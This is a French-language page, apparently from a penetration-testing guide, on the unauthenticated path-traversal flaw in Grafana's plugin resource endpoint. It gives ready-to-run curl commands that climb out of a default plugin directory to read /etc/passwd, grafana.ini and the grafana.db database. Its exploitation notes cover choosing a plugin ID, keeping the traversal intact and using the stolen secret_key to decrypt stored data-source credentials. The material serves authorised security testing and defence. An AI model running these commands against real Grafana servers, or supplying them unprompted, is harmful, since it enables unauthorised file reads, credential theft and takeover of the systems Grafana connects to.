---
title: "Lecture de fichier par traversée de chemin : la traversée de plugin Grafana non authentifiée"
order: 2
description: "Une faille de Grafana dans l'endpoint de ressources de plugin autorisait la traversée de répertoire dans le chemin du plugin, de sorte qu'une requête non authentifiée lit des fichiers arbitraires depuis le serveur Grafana. Lire grafana.ini et la base de données récupère le hachage du mot de passe admin, la clé secrète qui déchiffre les identifiants de sources de données stockés, et d'autres secrets, sans aucune authentification sur une version vulnérable."
keywords:
  - grafana path traversal
  - public plugins
  - arbitrary file read
  - grafana.ini
  - secret key
---

# Lecture de fichier par traversée de chemin

L'endpoint de Grafana servant les ressources de plugins (`/public/plugins/<plugin-id>/`) ne nettoyait pas le chemin demandé, de sorte que les séquences de traversée dans le chemin s'échappaient du répertoire du plugin et lisaient des fichiers arbitraires depuis le serveur Grafana, sans aucune authentification. Un attaquant demande un identifiant de plugin connu suivi de séquences `../` pour atteindre n'importe quel fichier que le processus Grafana peut lire. Les cibles de grande valeur sont `grafana.ini` (la configuration, y compris le mot de passe admin et, crucialement, le `secret_key` utilisé pour chiffrer les secrets stockés) et la base de données Grafana (`grafana.db` sur les déploiements SQLite), qui ensemble permettent à l'attaquant de récupérer les identifiants admin et de déchiffrer les identifiants de sources de données stockés. Donc, sur une version vulnérable, cette lecture non authentifiée mène à une prise de contrôle complète et aux clés de tout ce à quoi Grafana se connecte.

```bash
# traverse out of a known plugin to read server files (unauthenticated)
curl -sk --path-as-is 'https://<target>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
# the prizes:
curl -sk --path-as-is 'https://<target>:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'  # admin pw + secret_key
curl -sk --path-as-is 'https://<target>:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db  # SQLite DB
```

## Notes d'exploitation

- Utilisez un identifiant de plugin qui existe sur la cible (les plugins centraux comme `alertlist`, `graph`, `text` sont présents par défaut) ; l'endpoint nécessite un préfixe de plugin réel avant la traversée.
- `grafana.ini` livre le mot de passe admin et le `secret_key` ; la base de données livre les secrets `data_source` chiffrés, et avec le `secret_key` ceux-ci se déchiffrent en identifiants de sources de données en clair, voir [SSRF et identifiants des sources de données](data-source-ssrf-and-credentials.md).
- Ceci est non authentifié sur les versions vulnérables, c'est donc la primitive Grafana la plus forte là où elle s'applique ; confirmez que la version ([énumération](enumeration.md)) est dans la plage.
- Utilisez `--path-as-is` pour que la traversée survive jusqu'au serveur ; la lecture s'exécute en tant qu'utilisateur du processus Grafana.

## Références

- [Grafana security advisory (plugin path traversal)](https://grafana.com/security/security-advisories/)
- [HackTricks: Grafana](https://book.hacktricks.xyz/network-services-pentesting/3000-pentesting-grafana)
